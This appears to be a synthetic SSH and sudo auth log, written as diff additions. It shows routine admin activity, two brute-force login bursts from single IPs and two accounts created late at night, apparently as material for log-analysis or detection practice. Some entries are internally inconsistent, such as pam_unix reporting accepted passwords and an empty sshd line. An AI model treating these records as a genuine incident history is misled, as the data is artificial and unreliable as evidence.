+May 28 20:03:15 webserver sudo[42923]:  deploy : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/kill -9 1234
+May 28 21:24:07 webserver pam_unix[28150]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=deploy
+May 28 21:28:52 webserver sshd[38289]: Accepted publickey for priya from 115.240.89.12 port 60743 ssh2: RSA SHA256:5cf34c33e9903fb8de0f64a3
+May 28 21:59:02 webserver sshd[55698]: Accepted password for admin_ops from 122.161.45.67 port 50851 ssh2
+May 28 22:53:20 webserver sshd[22150]: Accepted publickey for ubuntu from 122.161.45.67 port 60216 ssh2: RSA SHA256:429e8334de397e0877544279
+May 28 23:28:50 webserver sudo[63413]:  priya : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+May 29 00:08:11 webserver sshd[33564]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=deploy
+May 29 00:23:10 webserver sshd[60747]: Accepted password for john from 115.240.89.12 port 64391 ssh2
+May 29 00:26:45 webserver sudo[27596]:  deploy : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/bin/chmod 600 /etc/ssl/private/server.key
+May 29 01:28:53 webserver pam_unix[25920]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+May 29 02:57:20 webserver CRON[33175]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+May 29 03:17:07 webserver sshd[38877]: Failed password for priya from 49.36.78.145 port 59416 ssh2
+May 29 04:51:20 webserver sshd[11430]: Accepted password for priya from 122.161.45.67 port 53906 ssh2
+May 29 05:38:31 webserver sshd[58845]: pam_unix(sshd:session): session closed for user priya
+May 29 07:33:56 webserver sshd[63692]: Accepted publickey for devops from 49.36.78.145 port 50399 ssh2: RSA SHA256:fe15710974e15e590316e4f9
+May 29 09:39:32 webserver sshd[48153]: Disconnected from authenticating user deploy 117.55.34.78 port 53051
+May 29 09:50:51 webserver pam_unix[31326]: pam_unix(sshd:session): session closed for user deploy
+May 29 10:02:36 webserver sshd[23465]: pam_unix(sshd:session): session closed for user priya
+May 29 10:12:18 webserver pam_unix[38869]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+May 29 11:33:44 webserver su[15322]: Successful su for root by deploy
+May 29 11:38:31 webserver sshd[38213]: Accepted password for priya from 122.161.45.67 port 40941 ssh2
+May 29 12:26:46 webserver sshd[29631]: Accepted password for deploy from 122.161.45.67 port 41471 ssh2
+May 29 13:10:34 webserver pam_unix[39389]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=priya
+May 29 13:11:10 webserver sshd[18498]: Accepted publickey for john from 14.139.123.45 port 56152 ssh2: RSA SHA256:110332d17fea8d3dbc00b6d7
+May 29 15:56:52 webserver sshd[15702]: Accepted password for john from 115.240.89.12 port 49018 ssh2
+May 29 17:21:38 webserver pam_unix[46884]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=devops
+May 29 18:52:11 webserver sshd[13710]: Accepted publickey for deploy from 117.55.34.78 port 44558 ssh2: RSA SHA256:96f736745e089283cb2423da
+May 29 19:37:58 webserver sshd[45998]: pam_unix(sshd:session): session closed for user ubuntu
+May 29 19:55:00 webserver sshd[58617]: Disconnected from authenticating user devops 117.55.34.78 port 51224
+May 29 20:36:44 webserver pam_unix[16132]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=devops
+May 29 22:31:36 webserver sshd[49723]: pam_unix(sshd:session): session closed for user ubuntu
+May 29 23:08:41 webserver sshd[55954]: Failed password for ubuntu from 122.161.45.67 port 64871 ssh2
+May 30 01:02:12 webserver passwd[63702]: pam_unix(passwd:chauthtok): password changed for priya
+May 30 03:20:02 webserver sshd[30930]: Failed password for priya from 194.165.16.22 port 53699 ssh2
+May 30 03:20:02 webserver sshd[22990]: Connection closed by invalid user test 194.165.16.22 port 53877 [preauth]
+May 30 03:20:04 webserver sshd[61124]: Failed password for oracle from 194.165.16.22 port 40374 ssh2
+May 30 03:20:05 webserver sshd[12031]: Connection closed by invalid user ubuntu 194.165.16.22 port 41836 [preauth]
+May 30 03:20:05 webserver sshd[39745]: Failed password for invalid user oracle from 194.165.16.22 port 62702 ssh2
+May 30 03:20:07 webserver sshd[40099]: Failed password for guest from 194.165.16.22 port 43875 ssh2
+May 30 03:20:13 webserver sshd[13694]: Failed password for guest from 194.165.16.22 port 44239 ssh2
+May 30 03:20:14 webserver sshd[22123]: Failed password for invalid user git from 194.165.16.22 port 45342 ssh2
+May 30 03:20:17 webserver sshd[10152]: Failed password for invalid user www-data from 194.165.16.22 port 58281 ssh2
+May 30 03:20:22 webserver sshd[33938]: Failed password for invalid user guest from 194.165.16.22 port 45445 ssh2
+May 30 03:20:24 webserver sshd[25798]: Failed password for admin from 194.165.16.22 port 52976 ssh2
+May 30 03:20:24 webserver sshd[54589]: Failed password for invalid user mysql from 194.165.16.22 port 41133 ssh2
+May 30 03:20:24 webserver sshd[55734]: Failed password for invalid user pi from 194.165.16.22 port 49696 ssh2
+May 30 03:20:25 webserver sshd[24772]: Failed password for john from 194.165.16.22 port 55922 ssh2
+May 30 03:20:26 webserver sshd[27435]: Failed password for invalid user webmaster from 194.165.16.22 port 56867 ssh2
+May 30 03:20:31 webserver sshd[31480]: Failed password for postgres from 194.165.16.22 port 59245 ssh2
+May 30 03:20:32 webserver sshd[35714]: Failed password for invalid user postgres from 194.165.16.22 port 50719 ssh2
+May 30 03:20:32 webserver sshd[39680]: Failed password for john from 194.165.16.22 port 48653 ssh2
+May 30 03:20:33 webserver sshd[60492]: Failed password for devops from 194.165.16.22 port 60566 ssh2
+May 30 03:20:34 webserver sshd[23323]: Failed password for admin_ops from 194.165.16.22 port 40200 ssh2
+May 30 03:20:34 webserver sshd[17112]: Failed password for admin from 194.165.16.22 port 51320 ssh2
+May 30 03:20:35 webserver sshd[30718]: Failed password for devops from 194.165.16.22 port 48096 ssh2
+May 30 03:20:36 webserver sshd[29914]: Failed password for john from 194.165.16.22 port 56395 ssh2
+May 30 03:20:38 webserver sshd[27462]: Failed password for john from 194.165.16.22 port 57602 ssh2
+May 30 03:20:39 webserver sshd[49718]: Failed password for john from 194.165.16.22 port 48513 ssh2
+May 30 03:20:45 webserver sshd[53401]: Failed password for postgres from 194.165.16.22 port 46895 ssh2
+May 30 03:20:49 webserver sshd[59696]: Failed password for admin_ops from 194.165.16.22 port 64444 ssh2
+May 30 03:20:49 webserver sshd[62026]: Failed password for invalid user oracle from 194.165.16.22 port 46322 ssh2
+May 30 03:20:53 webserver sshd[29942]: Failed password for invalid user git from 194.165.16.22 port 53031 ssh2
+May 30 03:20:54 webserver sshd[34872]: Failed password for invalid user admin from 194.165.16.22 port 63523 ssh2
+May 30 05:06:41 webserver sshd[17672]: pam_unix(sshd:session): session closed for user admin_ops
+May 30 06:58:25 webserver sshd[15863]: pam_unix(sshd:session): session closed for user devops
+May 30 08:00:40 webserver sshd[26609]: Accepted publickey for priya from 49.36.78.145 port 41843 ssh2: RSA SHA256:fda4bbab9459af650a4614cb
+May 30 08:26:04 webserver sshd[32951]: Failed password for priya from 14.139.123.45 port 48181 ssh2
+May 30 10:11:08 webserver sudo[30662]: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost=  user=root
+May 30 13:31:23 webserver passwd[34754]: pam_unix(passwd:chauthtok): password changed for admin_ops
+May 30 13:55:52 webserver sshd[61849]: Accepted password for john from 115.240.89.12 port 59321 ssh2
+May 30 14:52:33 webserver sshd[17386]: Failed password for deploy from 49.36.78.145 port 45089 ssh2
+May 30 16:32:23 webserver pam_unix[46043]: pam_unix(sshd:session): session closed for user deploy
+May 30 16:41:03 webserver sshd[14144]: Accepted password for ubuntu from 117.55.34.78 port 57455 ssh2
+May 30 17:43:52 webserver pam_unix[12482]: pam_unix(sshd:session): session opened for user john by (uid=0)
+May 30 18:57:44 webserver sudo[17417]:  admin_ops : TTY=pts/1 ; PWD=/home/admin_ops ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+May 30 18:59:07 webserver pam_unix[62128]: Accepted publickey for john from 49.36.78.145 port 58226 ssh2: RSA SHA256:8a096a8fcc6affc9c14c9bd7
+May 30 19:56:47 webserver sshd[19751]: Accepted publickey for john from 122.161.45.67 port 53914 ssh2: RSA SHA256:bd638ece6924045fe8a07487
+May 30 20:14:36 webserver sudo[41683]: pam_unix(sudo:auth): authentication failure; logname=john uid=1000 euid=0 tty=pts/0 ruser=john rhost=  user=root
+May 30 20:39:26 webserver sshd[53164]: Accepted password for ubuntu from 14.139.123.45 port 42947 ssh2
+May 30 21:10:09 webserver pam_unix[25845]: Accepted password for deploy from 103.21.244.10 port 51940 ssh2
+May 30 23:28:06 webserver pam_unix[28219]: Accepted publickey for devops from 49.36.78.145 port 56142 ssh2: RSA SHA256:cb08b2e286bb340740a21e1b
+May 30 23:38:00 webserver sshd[52649]: Accepted password for devops from 103.21.244.10 port 47316 ssh2
+May 31 01:46:54 webserver sshd[14062]: pam_unix(sshd:session): session opened for user john by (uid=0)
+May 31 02:21:45 webserver sshd[37847]: pam_unix(sshd:session): session opened for user john by (uid=0)
+May 31 03:38:56 webserver sshd[39527]: pam_unix(sshd:session): session opened for user john by (uid=0)
+May 31 06:12:15 webserver sshd[42043]: Accepted password for john from 14.139.123.45 port 57633 ssh2
+May 31 06:39:27 webserver su[63274]: Successful su for root by ubuntu
+May 31 08:30:11 webserver sshd[52645]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=ubuntu
+May 31 11:01:11 webserver CRON[20977]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+May 31 11:34:14 webserver sshd[47912]: Failed password for john from 115.240.89.12 port 54685 ssh2
+May 31 12:10:49 webserver sudo[55301]:  john : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app
+May 31 12:55:56 webserver sshd[55187]: Disconnected from authenticating user priya 117.55.34.78 port 40553
+May 31 14:11:26 webserver sshd[21069]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=deploy
+May 31 14:24:21 webserver sudo[52855]:  devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+May 31 15:23:06 webserver sshd[52303]: pam_unix(sshd:session): session opened for user john by (uid=0)
+May 31 15:57:40 webserver sshd[47037]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=devops
+May 31 16:09:29 webserver sudo[63796]:  ubuntu : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+May 31 16:14:20 webserver sshd[27549]: pam_unix(sshd:session): session closed for user deploy
+May 31 17:22:25 webserver sudo[22880]:  deploy : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+May 31 19:18:22 webserver sshd[38344]: Disconnected from authenticating user devops 122.161.45.67 port 50261
+May 31 19:30:59 webserver pam_unix[13963]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=admin_ops
+May 31 19:35:34 webserver sshd[62826]: pam_unix(sshd:session): session closed for user ubuntu
+May 31 19:39:18 webserver sshd[22116]: Failed password for priya from 117.55.34.78 port 45530 ssh2
+May 31 21:57:14 webserver sshd[59512]: Disconnected from authenticating user priya 14.139.123.45 port 48825
+May 31 22:32:50 webserver sudo[33895]:  devops : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+May 31 23:01:54 webserver pam_unix[41765]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 31 23:21:49 webserver pam_unix[13310]: Accepted publickey for deploy from 49.36.78.145 port 40822 ssh2: RSA SHA256:3d8ba0ab36116380bdbe05c5
+Jun  1 00:57:10 webserver sudo[25661]:  priya : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/kill -9 1234
+Jun  1 03:55:07 webserver CRON[12381]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+Jun  1 06:05:01 webserver sshd[62742]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun  1 06:38:10 webserver passwd[44803]: pam_unix(passwd:chauthtok): password changed for priya
+Jun  1 09:32:50 webserver pam_unix[55688]: Accepted password for devops from 49.36.78.145 port 53972 ssh2
+Jun  1 09:37:40 webserver pam_unix[48159]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun  1 09:39:35 webserver sshd[34773]: Accepted publickey for ubuntu from 122.161.45.67 port 58652 ssh2: RSA SHA256:021c7e6aeb6e5c533f51486d
+Jun  1 10:00:00 webserver sshd[12307]:
+Jun  1 10:33:44 webserver sshd[58479]: Failed password for priya from 122.161.45.67 port 41936 ssh2
+Jun  1 10:57:14 webserver pam_unix[20919]: Accepted publickey for devops from 14.139.123.45 port 64796 ssh2: RSA SHA256:26ceaa7fe920edf97a6f7862
+Jun  1 13:26:15 webserver pam_unix[12784]: Accepted password for priya from 14.139.123.45 port 51609 ssh2
+Jun  1 14:52:55 webserver sshd[58167]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+Jun  1 15:40:40 webserver su[20384]: pam_unix(su:auth): authentication failure; logname=devops uid=1000 euid=0 tty=pts/1 ruser=devops rhost=  user=root
+Jun  1 16:33:10 webserver sshd[11258]: Disconnected from authenticating user admin_ops 14.139.123.45 port 44219
+Jun  1 18:03:53 webserver sshd[40839]: Failed password for deploy from 122.161.45.67 port 41327 ssh2
+Jun  1 19:56:53 webserver passwd[64457]: pam_unix(passwd:chauthtok): password changed for devops
+Jun  1 22:00:45 webserver sshd[29652]: Failed password for devops from 14.139.123.45 port 53158 ssh2
+Jun  1 22:10:25 webserver pam_unix[39321]: Disconnected from authenticating user ubuntu 115.240.89.12 port 60412
+Jun  1 22:22:30 webserver sshd[17547]: Disconnected from authenticating user john 115.240.89.12 port 59057
+Jun  1 23:01:42 webserver sshd[42728]: pam_unix(sshd:session): session closed for user deploy
+Jun  1 23:55:33 webserver sshd[25389]: Disconnected from authenticating user priya 122.161.45.67 port 57402
+Jun  2 01:44:14 webserver sshd[20581]: Disconnected from authenticating user priya 14.139.123.45 port 50324
+Jun  2 03:37:04 webserver sshd[63336]: Accepted publickey for ubuntu from 117.55.34.78 port 56684 ssh2: RSA SHA256:e7a2d4a7f12be42aa895118c
+Jun  2 03:40:31 webserver pam_unix[39496]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=devops
+Jun  2 04:20:07 webserver sshd[41883]: Accepted password for ubuntu from 122.161.45.67 port 59393 ssh2
+Jun  2 04:52:31 webserver sshd[57501]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=admin_ops
+Jun  2 05:24:20 webserver sshd[38770]: pam_unix(sshd:session): session closed for user priya
+Jun  2 05:50:21 webserver sshd[13573]: Accepted password for ubuntu from 122.161.45.67 port 59635 ssh2
+Jun  2 09:41:33 webserver sudo[15744]:  deploy : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/docker restart api_container
+Jun  2 09:49:30 webserver pam_unix[59470]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=devops
+Jun  2 11:12:41 webserver sshd[25742]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=ubuntu
+Jun  2 11:28:41 webserver sshd[25404]: Accepted publickey for priya from 115.240.89.12 port 58175 ssh2: RSA SHA256:d2f350ac72ab7e7ef15db666
+Jun  2 11:43:26 webserver sudo[34481]: pam_unix(sudo:auth): authentication failure; logname=priya uid=1000 euid=0 tty=pts/0 ruser=priya rhost=  user=root
+Jun  2 14:06:31 webserver pam_unix[24813]: pam_unix(sshd:session): session closed for user john
+Jun  2 15:44:04 webserver sshd[31071]: Failed password for ubuntu from 49.36.78.145 port 49942 ssh2
+Jun  2 16:46:50 webserver CRON[22176]: pam_unix(cron:session): session closed for user ubuntu
+Jun  2 18:07:54 webserver pam_unix[55247]: Accepted password for john from 14.139.123.45 port 46826 ssh2
+Jun  2 18:45:25 webserver sudo[64210]: pam_unix(sudo:auth): authentication failure; logname=admin_ops uid=1000 euid=0 tty=pts/0 ruser=admin_ops rhost=  user=root
+Jun  2 18:58:18 webserver pam_unix[36576]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun  2 20:20:58 webserver sshd[62185]: Accepted password for john from 49.36.78.145 port 45902 ssh2
+Jun  2 20:41:18 webserver pam_unix[41604]: Accepted publickey for john from 115.240.89.12 port 41048 ssh2: RSA SHA256:8932f08f0f928bf1494dd4dc
+Jun  2 21:12:52 webserver sshd[14751]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=john
+Jun  2 23:10:16 webserver sudo[59833]: pam_unix(sudo:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/0 ruser=deploy rhost=  user=root
+Jun  2 23:53:41 webserver CRON[47560]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+Jun  3 00:23:56 webserver useradd[44896]: new user: name=svc_cache, UID=1796, GID=1537, home=/home/svc_cache, shell=/bin/bash
+Jun  3 02:44:43 webserver sshd[21079]: Accepted password for john from 49.36.78.145 port 40977 ssh2
+Jun  3 04:40:12 webserver sudo[45668]:  priya : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+Jun  3 05:38:39 webserver CRON[40175]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+Jun  3 06:55:05 webserver CRON[63925]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun  3 07:02:27 webserver pam_unix[15751]: Accepted password for admin_ops from 14.139.123.45 port 50776 ssh2
+Jun  3 07:06:04 webserver sshd[20884]: Accepted publickey for priya from 49.36.78.145 port 58320 ssh2: RSA SHA256:862793f2887a04fe4f8ebb66
+Jun  3 08:47:37 webserver sudo[22729]:  deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Jun  3 08:47:49 webserver sudo[43246]:  john : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql
+Jun  3 09:16:40 webserver sudo[39993]: pam_unix(sudo:auth): authentication failure; logname=guest uid=1000 euid=0 tty=pts/0 ruser=guest rhost=  user=root
+Jun  3 11:07:27 webserver sudo[47520]: pam_unix(sudo:auth): authentication failure; logname=root uid=1000 euid=0 tty=pts/0 ruser=root rhost=  user=root
+Jun  3 11:15:00 webserver sudo[60562]:  admin_ops : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Jun  3 11:43:31 webserver sshd[56747]: Accepted publickey for devops from 122.161.45.67 port 51145 ssh2: RSA SHA256:4325f0df7d840fb511b8c95b
+Jun  3 13:28:24 webserver su[60088]: pam_unix(su:auth): authentication failure; logname=john uid=1000 euid=0 tty=pts/1 ruser=john rhost=  user=root
+Jun  3 14:18:29 webserver pam_unix[40485]: Accepted publickey for admin_ops from 103.21.244.10 port 59454 ssh2: RSA SHA256:b72d218b2b9da74518c473ae
+Jun  3 16:02:47 webserver pam_unix[41823]: Accepted password for ubuntu from 115.240.89.12 port 52824 ssh2
+Jun  3 17:23:05 webserver passwd[20371]: pam_unix(passwd:chauthtok): password changed for deploy
+Jun  3 17:48:56 webserver sshd[30378]: Accepted password for john from 117.55.34.78 port 58970 ssh2
+Jun  3 17:52:45 webserver sudo[63512]:  ubuntu : TTY=pts/2 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/certbot renew
+Jun  3 18:23:29 webserver pam_unix[13338]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=devops
+Jun  3 19:52:22 webserver sshd[18028]: Accepted password for admin_ops from 103.21.244.10 port 47885 ssh2
+Jun  3 21:28:25 webserver sshd[52876]: Accepted publickey for admin_ops from 103.21.244.10 port 57021 ssh2: RSA SHA256:fa0063b26bdbd33fbc77d504
+Jun  3 23:58:07 webserver su[25485]: pam_unix(su:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+Jun  4 00:10:00 webserver sshd[38845]: Failed password for invalid user www-data from 91.240.118.77 port 40257 ssh2
+Jun  4 00:10:03 webserver sshd[32829]: Failed password for invalid user guest from 91.240.118.77 port 47018 ssh2
+Jun  4 00:10:05 webserver sshd[22845]: Failed password for admin from 91.240.118.77 port 45377 ssh2
+Jun  4 00:10:06 webserver sshd[64796]: Failed password for invalid user postgres from 91.240.118.77 port 49020 ssh2
+Jun  4 00:10:06 webserver sshd[63643]: Failed password for guest from 91.240.118.77 port 58820 ssh2
+Jun  4 00:10:09 webserver sshd[28670]: Failed password for invalid user deploy2 from 91.240.118.77 port 64847 ssh2
+Jun  4 00:10:16 webserver sshd[36827]: Failed password for devops from 91.240.118.77 port 57645 ssh2
+Jun  4 00:10:16 webserver sshd[14389]: Failed password for postgres from 91.240.118.77 port 56947 ssh2
+Jun  4 00:10:17 webserver sshd[53249]: Failed password for invalid user ubuntu2 from 91.240.118.77 port 46091 ssh2
+Jun  4 00:10:18 webserver sshd[64377]: Connection closed by invalid user devops 91.240.118.77 port 40396 [preauth]
+Jun  4 00:10:21 webserver sshd[35024]: Failed password for invalid user root from 91.240.118.77 port 42294 ssh2
+Jun  4 00:10:22 webserver sshd[19678]: Failed password for john from 91.240.118.77 port 45075 ssh2
+Jun  4 00:10:26 webserver sshd[40202]: Failed password for admin_ops from 91.240.118.77 port 55782 ssh2
+Jun  4 00:10:27 webserver sshd[13188]: Failed password for invalid user pi from 91.240.118.77 port 40574 ssh2
+Jun  4 00:10:27 webserver sshd[24734]: Failed password for john from 91.240.118.77 port 40830 ssh2
+Jun  4 00:10:28 webserver sshd[45985]: Failed password for john from 91.240.118.77 port 46436 ssh2
+Jun  4 00:10:33 webserver sshd[22844]: Failed password for invalid user nagios from 91.240.118.77 port 42422 ssh2
+Jun  4 00:10:34 webserver sshd[38790]: Failed password for root from 91.240.118.77 port 47832 ssh2
+Jun  4 00:10:35 webserver sshd[60360]: Connection closed by invalid user oracle 91.240.118.77 port 55122 [preauth]
+Jun  4 00:10:36 webserver sshd[38960]: Failed password for invalid user ubuntu2 from 91.240.118.77 port 46242 ssh2
+Jun  4 00:10:38 webserver sshd[39671]: Connection closed by invalid user john 91.240.118.77 port 40812 [preauth]
+Jun  4 00:10:42 webserver sshd[20090]: Failed password for postgres from 91.240.118.77 port 59942 ssh2
+Jun  4 00:10:45 webserver sshd[44876]: Failed password for admin from 91.240.118.77 port 46911 ssh2
+Jun  4 00:10:47 webserver sshd[55245]: Failed password for invalid user webmaster from 91.240.118.77 port 53964 ssh2
+Jun  4 00:10:47 webserver sshd[52539]: Failed password for priya from 91.240.118.77 port 54910 ssh2
+Jun  4 00:10:50 webserver sshd[29102]: Connection closed by invalid user priya 91.240.118.77 port 45060 [preauth]
+Jun  4 00:10:51 webserver sshd[47878]: Failed password for invalid user nagios from 91.240.118.77 port 59368 ssh2
+Jun  4 00:10:51 webserver sshd[54375]: Failed password for root from 91.240.118.77 port 61839 ssh2
+Jun  4 00:10:51 webserver sshd[58889]: Failed password for invalid user ubuntu2 from 91.240.118.77 port 45065 ssh2
+Jun  4 00:10:55 webserver sshd[30961]: Failed password for guest from 91.240.118.77 port 54866 ssh2
+Jun  4 00:38:40 webserver useradd[28997]: new user: name=svc_db, UID=1128, GID=1271, home=/home/svc_db, shell=/bin/bash
+Jun  4 03:25:21 webserver sshd[14948]: Failed password for priya from 14.139.123.45 port 59191 ssh2
+Jun  4 05:39:59 webserver sudo[12653]: pam_unix(sudo:auth): authentication failure; logname=test uid=1000 euid=0 tty=pts/0 ruser=test rhost=  user=root
+Jun  4 05:57:18 webserver sshd[54495]: Disconnected from authenticating user john 14.139.123.45 port 62104
+Jun  4 06:17:50 webserver sshd[22021]: Accepted password for devops from 103.21.244.10 port 41722 ssh2
+Jun  4 07:44:28 webserver sudo[58762]:  ubuntu : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Jun  4 09:28:11 webserver sshd[57682]: pam_unix(sshd:session): session closed for user deploy
+Jun  4 11:04:04 webserver pam_unix[52069]: Accepted password for john from 117.55.34.78 port 40669 ssh2
+Jun  4 11:42:07 webserver sshd[28393]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun  4 12:07:26 webserver sshd[46420]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=admin_ops
+Jun  4 15:26:31 webserver pam_unix[10295]: Disconnected from authenticating user devops 122.161.45.67 port 60003
+Jun  4 17:00:39 webserver sudo[52068]: pam_unix(sudo:auth): authentication failure; logname=admin uid=1000 euid=0 tty=pts/0 ruser=admin rhost=  user=root
+Jun  4 18:10:24 webserver sshd[31068]: Disconnected from authenticating user ubuntu 122.161.45.67 port 56696
+Jun  4 18:20:04 webserver sudo[22907]:  john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql
+Jun  4 18:21:21 webserver sudo[36796]:  deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/certbot renew
+Jun  4 21:54:28 webserver sshd[53783]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=admin_ops
+Jun  4 23:08:48 webserver pam_unix[36391]: Accepted publickey for deploy from 103.21.244.10 port 62123 ssh2: RSA SHA256:dad8e65da8b88f12348787a4
+Jun  5 01:20:34 webserver sshd[14347]: Accepted publickey for deploy from 117.55.34.78 port 54645 ssh2: RSA SHA256:205192f3f65bf394ea692774
+Jun  5 01:43:34 webserver sshd[32625]: Accepted publickey for john from 117.55.34.78 port 60092 ssh2: RSA SHA256:ee47862f7ef22178550a8ba2
+Jun  5 02:28:14 webserver sudo[50423]:  priya : TTY=pts/2 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/docker ps
+Jun  5 02:36:39 webserver sshd[40164]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=john
+Jun  5 02:55:36 webserver sshd[29791]: Accepted password for ubuntu from 103.21.244.10 port 63519 ssh2
+Jun  5 04:53:28 webserver sshd[43223]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=priya
+Jun  5 05:11:11 webserver pam_unix[54044]: Accepted password for devops from 115.240.89.12 port 61230 ssh2
+Jun  5 07:19:13 webserver sshd[21388]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=admin_ops
+Jun  5 09:12:50 webserver sshd[45576]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=admin_ops
+Jun  5 10:32:48 webserver CRON[50923]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+Jun  5 10:44:08 webserver sshd[31343]: Accepted password for ubuntu from 117.55.34.78 port 40649 ssh2
+Jun  5 12:00:28 webserver sshd[46502]: Accepted password for priya from 103.21.244.10 port 49385 ssh2
+Jun  5 12:10:06 webserver sudo[30047]: pam_unix(sudo:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/0 ruser=deploy rhost=  user=root
+Jun  5 12:55:25 webserver sshd[38743]: pam_unix(sshd:session): session closed for user john
+Jun  5 13:28:31 webserver sshd[26094]: pam_unix(sshd:session): session closed for user devops
+Jun  5 13:48:11 webserver sudo[64159]:  deploy : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Jun  5 14:07:16 webserver pam_unix[57841]: Accepted password for john from 115.240.89.12 port 41800 ssh2
+Jun  5 14:08:39 webserver pam_unix[61249]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun  5 14:33:28 webserver pam_unix[11781]: Accepted publickey for deploy from 103.21.244.10 port 59773 ssh2: RSA SHA256:332f8f3e2fabc9d40a2c6219
+Jun  5 14:45:52 webserver sshd[12200]: Disconnected from authenticating user devops 103.21.244.10 port 56295
+Jun  5 15:48:40 webserver sshd[20341]: Accepted password for priya from 103.21.244.10 port 55541 ssh2
+Jun  5 16:40:33 webserver sudo[27374]: pam_unix(sudo:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/0 ruser=deploy rhost=  user=root
+Jun  5 16:49:55 webserver sudo[64011]:  admin_ops : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 600 /etc/ssl/private/server.key
+Jun  5 16:59:39 webserver pam_unix[14366]: Disconnected from authenticating user admin_ops 14.139.123.45 port 56033
+Jun  5 18:11:48 webserver sshd[20404]: pam_unix(sshd:session): session closed for user priya
